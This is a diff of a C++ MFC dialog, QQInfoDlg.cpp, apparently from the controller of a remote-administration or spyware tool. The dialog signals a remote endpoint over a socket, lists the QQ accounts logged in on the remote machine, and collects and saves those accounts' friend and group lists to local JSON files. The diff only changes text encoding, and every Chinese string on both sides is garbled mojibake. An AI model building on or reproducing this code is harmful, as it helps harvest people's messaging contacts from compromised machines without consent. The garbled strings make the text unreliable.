@@ -1,4 +1,4 @@
-// QQInfoDlg.cpp : implementation file
+ï»¿// QQInfoDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -65,11 +65,11 @@ BOOL CQQInfoDlg::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - ºÃÓÑĞÅÏ¢", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - å¥½å‹ä¿¡æ¯", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
-	SetDlgItemText(IDC_BTN_USER, "ÕıÔÚ»ñÈ¡£¬ÇëÉÔºò...");
+	SetDlgItemText(IDC_BTN_USER, "æ­£åœ¨è·å–ï¼Œè¯·ç¨å€™...");
 	
-	// Í¨ÖªÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ¾­´ò¿ª
+	// é€šçŸ¥è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²ç»æ‰“å¼€
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 	
@@ -104,13 +104,13 @@ void CQQInfoDlg::OnReceiveComplete()
 				m_listuser.AddString(strUser);
 			}
 		}
-		SetDlgItemText(IDC_BTN_USER, "->²é¿´ÒÑµÇÂ¼QQĞÅÏ¢<-");
+		SetDlgItemText(IDC_BTN_USER, "->æŸ¥çœ‹å·²ç™»å½•QQä¿¡æ¯<-");
 		GetDlgItem(IDC_BTN_USER)->EnableWindow(TRUE);
 		GetDlgItem(IDC_BTN_FRIEND)->EnableWindow(TRUE);
 		GetDlgItem(IDC_BTN_GROUP)->EnableWindow(TRUE);
 		break;
 	default:
-		// ´«Êä·¢ÉúÒì³£Êı¾İ
+		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
 		break;
 	}
 }
@@ -118,8 +118,8 @@ void CQQInfoDlg::OnReceiveComplete()
 void CQQInfoDlg::OnBtnUser() 
 {
 	// TODO: Add your control notification handler code here
-	SetDlgItemText(IDC_BTN_USER, "ÕıÔÚ»ñÈ¡£¬ÇëÉÔºò...");
-	SetDlgItemText(IDC_BTN_FRIEND, "²é¿´ÒÑ±£´æQQĞÅÏ¢");
+	SetDlgItemText(IDC_BTN_USER, "æ­£åœ¨è·å–ï¼Œè¯·ç¨å€™...");
+	SetDlgItemText(IDC_BTN_FRIEND, "æŸ¥çœ‹å·²ä¿å­˜QQä¿¡æ¯");
 	GetDlgItem(IDC_BTN_USER)->EnableWindow(FALSE);
 	GetDlgItem(IDC_BTN_FRIEND)->EnableWindow(FALSE);
 	GetDlgItem(IDC_BTN_GROUP)->EnableWindow(FALSE);
@@ -142,8 +142,8 @@ void CQQInfoDlg::OnBtnFriend()
 	cJSON *nickname;
 	cJSON *uin;
 
-	SetDlgItemText(IDC_BTN_USER, "²é¿´ÒÑµÇÂ¼QQĞÅÏ¢");
-	SetDlgItemText(IDC_BTN_FRIEND, "ÕıÔÚ»ñÈ¡£¬ÇëÉÔºò...");
+	SetDlgItemText(IDC_BTN_USER, "æŸ¥çœ‹å·²ç™»å½•QQä¿¡æ¯");
+	SetDlgItemText(IDC_BTN_FRIEND, "æ­£åœ¨è·å–ï¼Œè¯·ç¨å€™...");
 	GetDlgItem(IDC_BTN_USER)->EnableWindow(FALSE);
 	GetDlgItem(IDC_BTN_FRIEND)->EnableWindow(FALSE);
 	GetDlgItem(IDC_BTN_GROUP)->EnableWindow(FALSE);
@@ -157,7 +157,7 @@ void CQQInfoDlg::OnBtnFriend()
 	}
 
 	m_pQQLocalJson = cJSON_CreateArray();
-	strFind.Format("%s\\Plugins\\%s\\*.txt", ((CClientApp *)AfxGetApp())->AppPath, "ºÃÓÑĞÅÏ¢");
+	strFind.Format("%s\\Plugins\\%s\\*.txt", ((CClientApp *)AfxGetApp())->AppPath, "å¥½å‹ä¿¡æ¯");
 	BOOL bFind = finder.FindFile(strFind);
 	while (bFind)
 	{
@@ -183,7 +183,7 @@ void CQQInfoDlg::OnBtnFriend()
 	}
 	finder.Close();
 
-	SetDlgItemText(IDC_BTN_FRIEND, "->²é¿´ÒÑ±£´æQQĞÅÏ¢<-");
+	SetDlgItemText(IDC_BTN_FRIEND, "->æŸ¥çœ‹å·²ä¿å­˜QQä¿¡æ¯<-");
 	GetDlgItem(IDC_BTN_USER)->EnableWindow(TRUE);
 	GetDlgItem(IDC_BTN_FRIEND)->EnableWindow(TRUE);
 }
@@ -204,7 +204,7 @@ void CQQInfoDlg::OnBtnGroup()
 		return;
 	if (m_pQQLocalJson == NULL)
 		return;
-	strFileName.Format("%s\\Plugins\\%s", ((CClientApp *)AfxGetApp())->AppPath, "ºÃÓÑĞÅÏ¢");
+	strFileName.Format("%s\\Plugins\\%s", ((CClientApp *)AfxGetApp())->AppPath, "å¥½å‹ä¿¡æ¯");
 	CreateDirectory(strFileName, NULL);
 	for (user = m_pQQLocalJson->child; user; user = user->next)
 	{
@@ -216,7 +216,7 @@ void CQQInfoDlg::OnBtnGroup()
 		pQQGroupJson = cJSON_GetObjectItem(user, "groups");
 		if (pQQFriendJson == NULL && pQQGroupJson == NULL)
 			continue;
-		strFileName.Format("%s\\Plugins\\%s\\%s.txt", ((CClientApp *)AfxGetApp())->AppPath, "ºÃÓÑĞÅÏ¢", uin->valuestring);
+		strFileName.Format("%s\\Plugins\\%s\\%s.txt", ((CClientApp *)AfxGetApp())->AppPath, "å¥½å‹ä¿¡æ¯", uin->valuestring);
 		if (!file.Open(strFileName, CFile::modeCreate|CFile::modeWrite))
 			continue;
 		szBuffer = cJSON_PrintUnformatted(user);
@@ -224,7 +224,7 @@ void CQQInfoDlg::OnBtnGroup()
 		free(szBuffer);
 		file.Close();
 	}
-	MessageBox("¸Ã»úÒÑµÇÂ¼QQĞÅÏ¢±£´æÍê³É", "ĞÅÏ¢", MB_ICONINFORMATION);
+	MessageBox("è¯¥æœºå·²ç™»å½•QQä¿¡æ¯ä¿å­˜å®Œæˆ", "ä¿¡æ¯", MB_ICONINFORMATION);
 }
 
 void CQQInfoDlg::OnDblclkListUser() 
@@ -280,7 +280,7 @@ void CQQInfoDlg::AddTreeFriendByNumber(CString strQQNumber)
 				if (gname)
 					szQQGroupName = gname->valuestring;
 				else
-					szQQGroupName = "ÎÒµÄºÃÓÑ";
+					szQQGroupName = "æˆ‘çš„å¥½å‹";
 				strQQGroupName = szQQGroupName;
 				strQQGroupName += "[0]";
 				HTREEITEM hTreeItem = m_treefriend.InsertItem(strQQGroupName, TVI_ROOT);
